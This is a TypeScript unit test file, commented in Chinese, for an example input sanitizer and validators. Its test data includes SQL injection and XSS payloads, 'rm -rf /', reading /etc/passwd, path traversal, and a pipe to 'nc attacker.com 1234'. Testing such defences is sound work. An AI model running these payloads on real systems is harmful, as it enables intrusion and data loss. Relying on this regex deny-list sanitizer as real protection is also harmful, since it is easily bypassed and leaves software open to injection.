/**
 * @file 输入验证单元测试
 * @description 测试输入验证和清理功能
 * @module __tests__/unit/security/InputValidation.test
 * @author YYC³
 * @version 1.0.0
 * @created 2026-01-20
 */

import { describe, it, expect } from 'vitest';

/**
 * 输入清理工具类（示例实现）
 */
class InputSanitizer {
  /**
   * SQL注入防护
   */
  static sanitizeSQL(input: string): string {
    // 移除危险字符
    return input
      .replace(/['";]/g, '')
      .replace(/--/g, '')
      .replace(/\/\*/g, '')
      .replace(/\*\//g, '')
      .replace(/DROP/gi, '')
      .replace(/DELETE/gi, '')
      .replace(/TRUNCATE/gi, '')
      .replace(/UNION/gi, '');
  }

  /**
   * XSS攻击防护
   */
  static sanitizeHTML(input: string): string {
    return input
      .replace(/<script[^>]*>.*?<\/script>/gi, '')
      .replace(/<iframe[^>]*>.*?<\/iframe>/gi, '')
      .replace(/javascript:/gi, '')
      .replace(/on\w+\s*=/gi, '')
      .replace(/<embed[^>]*>/gi, '')
      .replace(/<object[^>]*>.*?<\/object>/gi, '');
  }

  /**
   * 命令注入防护
   */
  static sanitizeCommand(input: string): string {
    return input
      .replace(/[;|&$`]/g, '')
      .replace(/\|\|/g, '')
      .replace(/&&/g, '')
      .replace(/\n/g, '')
      .replace(/\r/g, '');
  }

  /**
   * 路径遍历防护
   */
  static sanitizePath(input: string): string {
    let result = input
      .replace(/\.\./g, '')
      .replace(/~\//g, '')
      .replace(/\\/g, '');
    
    // 循环替换所有连续斜杠
    while (result.includes('//')) {
      result = result.replace(/\/\//g, '/');
    }
    
    return result;
  }

  /**
   * 通用清理
   */
  static sanitize(input: string, type: 'sql' | 'html' | 'command' | 'path' = 'html'): string {
    switch (type) {
      case 'sql':
        return this.sanitizeSQL(input);
      case 'html':
        return this.sanitizeHTML(input);
      case 'command':
        return this.sanitizeCommand(input);
      case 'path':
        return this.sanitizePath(input);
      default:
        return input;
    }
  }
}

describe('输入验证 - SQL注入防护', () => {
  it('应该移除SQL注入尝试中的单引号', () => {
    const malicious = "'; DROP TABLE users; --";
    const sanitized = InputSanitizer.sanitizeSQL(malicious);
    
    expect(sanitized).not.toContain("'");
    expect(sanitized).not.toContain(';');
    expect(sanitized).not.toContain('--');
  });

  it('应该移除SQL注释标记', () => {
    const malicious = "test /* comment */ value";
    const sanitized = InputSanitizer.sanitizeSQL(malicious);
    
    expect(sanitized).not.toContain('/*');
    expect(sanitized).not.toContain('*/');
  });

  it('应该移除危险的SQL关键字', () => {
    const malicious = "admin' OR '1'='1'; DROP TABLE users;";
    const sanitized = InputSanitizer.sanitizeSQL(malicious);
    
    expect(sanitized.toLowerCase()).not.toContain('drop');
    expect(sanitized).not.toContain(';');
  });

  it('应该处理UNION注入尝试', () => {
    const malicious = "1' UNION SELECT * FROM passwords--";
    const sanitized = InputSanitizer.sanitizeSQL(malicious);
    
    expect(sanitized.toLowerCase()).not.toContain('union');
    expect(sanitized).not.toContain('--');
  });

  it('应该允许安全的输入', () => {
    const safe = "normal user input";
    const sanitized = InputSanitizer.sanitizeSQL(safe);
    
    expect(sanitized).toBe(safe);
  });
});

describe('输入验证 - XSS防护', () => {
  it('应该移除script标签', () => {
    const malicious = '<script>alert("XSS")</script>';
    const sanitized = InputSanitizer.sanitizeHTML(malicious);
    
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('</script>');
  });

  it('应该移除内联事件处理器', () => {
    const malicious = '<img src=x onerror=alert("XSS")>';
    const sanitized = InputSanitizer.sanitizeHTML(malicious);
    
    expect(sanitized.toLowerCase()).not.toContain('onerror');
  });

  it('应该移除javascript协议', () => {
    const malicious = '<a href="javascript:alert(\'XSS\')">Click</a>';
    const sanitized = InputSanitizer.sanitizeHTML(malicious);
    
    expect(sanitized.toLowerCase()).not.toContain('javascript:');
  });

  it('应该移除iframe标签', () => {
    const malicious = '<iframe src="evil.com"></iframe>';
    const sanitized = InputSanitizer.sanitizeHTML(malicious);
    
    expect(sanitized).not.toContain('<iframe');
    expect(sanitized).not.toContain('</iframe>');
  });

  it('应该移除embed和object标签', () => {
    const malicious = '<embed src="evil.swf"><object data="evil.swf"></object>';
    const sanitized = InputSanitizer.sanitizeHTML(malicious);
    
    expect(sanitized).not.toContain('<embed');
    expect(sanitized).not.toContain('<object');
  });

  it('应该允许安全的HTML标签', () => {
    const safe = '<p>This is <strong>safe</strong> content</p>';
    const sanitized = InputSanitizer.sanitizeHTML(safe);
    
    expect(sanitized).toContain('<p>');
    expect(sanitized).toContain('<strong>');
  });
});

describe('输入验证 - 命令注入防护', () => {
  it('应该移除命令分隔符', () => {
    const malicious = 'file.txt; rm -rf /';
    const sanitized = InputSanitizer.sanitizeCommand(malicious);
    
    expect(sanitized).not.toContain(';');
  });

  it('应该移除管道操作符', () => {
    const malicious = 'file.txt | nc attacker.com 1234';
    const sanitized = InputSanitizer.sanitizeCommand(malicious);
    
    expect(sanitized).not.toContain('|');
  });

  it('应该移除逻辑操作符', () => {
    const malicious = 'file.txt && cat /etc/passwd';
    const sanitized = InputSanitizer.sanitizeCommand(malicious);
    
    expect(sanitized).not.toContain('&&');
  });

  it('应该移除命令替换符号', () => {
    const malicious = 'file.txt`whoami`';
    const sanitized = InputSanitizer.sanitizeCommand(malicious);
    
    expect(sanitized).not.toContain('`');
  });

  it('应该移除换行符', () => {
    const malicious = 'file.txt\nrm -rf /';
    const sanitized = InputSanitizer.sanitizeCommand(malicious);
    
    expect(sanitized).not.toContain('\n');
    expect(sanitized).not.toContain('\r');
  });
});

describe('输入验证 - 路径遍历防护', () => {
  it('应该移除父目录引用', () => {
    const malicious = '../../../etc/passwd';
    const sanitized = InputSanitizer.sanitizePath(malicious);
    
    expect(sanitized).not.toContain('..');
  });

  it('应该移除home目录引用', () => {
    const malicious = '~/../../etc/passwd';
    const sanitized = InputSanitizer.sanitizePath(malicious);
    
    expect(sanitized).not.toContain('~/');
  });

  it('应该规范化斜杠', () => {
    const malicious = 'path//to///file';
    const sanitized = InputSanitizer.sanitizePath(malicious);
    
    expect(sanitized).not.toContain('//');
  });

  it('应该移除反斜杠', () => {
    const malicious = 'path\\to\\file';
    const sanitized = InputSanitizer.sanitizePath(malicious);
    
    expect(sanitized).not.toContain('\\');
  });

  it('应该允许安全的路径', () => {
    const safe = 'documents/report.pdf';
    const sanitized = InputSanitizer.sanitizePath(safe);
    
    expect(sanitized).toBe(safe);
  });
});

describe('输入验证 - 邮箱验证', () => {
  const isValidEmail = (email: string): boolean => {
    // 更严格的邮箱验证规则
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    // 额外检查：不允许连续的点
    if (email.includes('..')) return false;
    // 检查@符号前后不能为空
    const parts = email.split('@');
    if (parts.length !== 2 || !parts[0] || !parts[1]) return false;
    return emailRegex.test(email);
  };

  it('应该接受有效的邮箱地址', () => {
    const validEmails = [
      'user@example.com',
      'test.user@example.com',
      'user+tag@example.co.uk',
      'user123@test-domain.com',
    ];

    validEmails.forEach(email => {
      expect(isValidEmail(email)).toBe(true);
    });
  });

  it('应该拒绝无效的邮箱地址', () => {
    const invalidEmails = [
      'invalid',
      '@example.com',
      'user@',
      'user @example.com',
      'user@example',
      'user..name@example.com',
    ];

    invalidEmails.forEach(email => {
      expect(isValidEmail(email)).toBe(false);
    });
  });
});

describe('输入验证 - 密码强度验证', () => {
  const isStrongPassword = (password: string): boolean => {
    // 至少8个字符，包含大小写字母、数字和特殊字符
    const minLength = password.length >= 8;
    const hasUpperCase = /[A-Z]/.test(password);
    const hasLowerCase = /[a-z]/.test(password);
    const hasNumber = /\d/.test(password);
    const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);

    return minLength && hasUpperCase && hasLowerCase && hasNumber && hasSpecialChar;
  };

  it('应该接受强密码', () => {
    const strongPasswords = [
      'SecurePass123!',
      'MyP@ssw0rd',
      'C0mpl3x!Pass',
      'Str0ng#Password',
    ];

    strongPasswords.forEach(password => {
      expect(isStrongPassword(password)).toBe(true);
    });
  });

  it('应该拒绝弱密码', () => {
    const weakPasswords = [
      '123456',           // 太短，没有字母
      'password',         // 没有数字和特殊字符
      'Password',         // 没有数字和特殊字符
      'Pass123',          // 太短，没有特殊字符
      'password123',      // 没有大写字母和特殊字符
      'PASSWORD123!',     // 没有小写字母
    ];

    weakPasswords.forEach(password => {
      expect(isStrongPassword(password)).toBe(false);
    });
  });
});

describe('输入验证 - URL验证', () => {
  const isValidURL = (url: string): boolean => {
    try {
      const parsed = new URL(url);
      return ['http:', 'https:'].includes(parsed.protocol);
    } catch {
      return false;
    }
  };

  it('应该接受有效的URL', () => {
    const validURLs = [
      'https://example.com',
      'http://www.example.com',
      'https://example.com/path/to/resource',
      'https://example.com:8080/path?query=value',
    ];

    validURLs.forEach(url => {
      expect(isValidURL(url)).toBe(true);
    });
  });

  it('应该拒绝无效或危险的URL', () => {
    const invalidURLs = [
      'javascript:alert("XSS")',
      'file:///etc/passwd',
      'data:text/html,<script>alert("XSS")</script>',
      'not a url',
      'ftp://example.com',
    ];

    invalidURLs.forEach(url => {
      expect(isValidURL(url)).toBe(false);
    });
  });
});

describe('输入验证 - 文件名验证', () => {
  const isValidFilename = (filename: string): boolean => {
    // 不允许路径遍历和特殊字符
    const invalidChars = /[<>:"|?*\x00-\x1F]/;
    const pathTraversal = /\.\./;
    
    return !invalidChars.test(filename) && 
           !pathTraversal.test(filename) &&
           filename.length > 0 &&
           filename.length <= 255;
  };

  it('应该接受有效的文件名', () => {
    const validFilenames = [
      'document.pdf',
      'report_2024.xlsx',
      'image-001.jpg',
      'my-file.txt',
    ];

    validFilenames.forEach(filename => {
      expect(isValidFilename(filename)).toBe(true);
    });
  });

  it('应该拒绝包含路径遍历的文件名', () => {
    const invalidFilenames = [
      '../../../etc/passwd',
      '..\\..\\windows\\system32',
      'file../other.txt',
    ];

    invalidFilenames.forEach(filename => {
      expect(isValidFilename(filename)).toBe(false);
    });
  });

  it('应该拒绝包含特殊字符的文件名', () => {
    const invalidFilenames = [
      'file<>.txt',
      'file|name.txt',
      'file?.txt',
      'file*.txt',
    ];

    invalidFilenames.forEach(filename => {
      expect(isValidFilename(filename)).toBe(false);
    });
  });
});
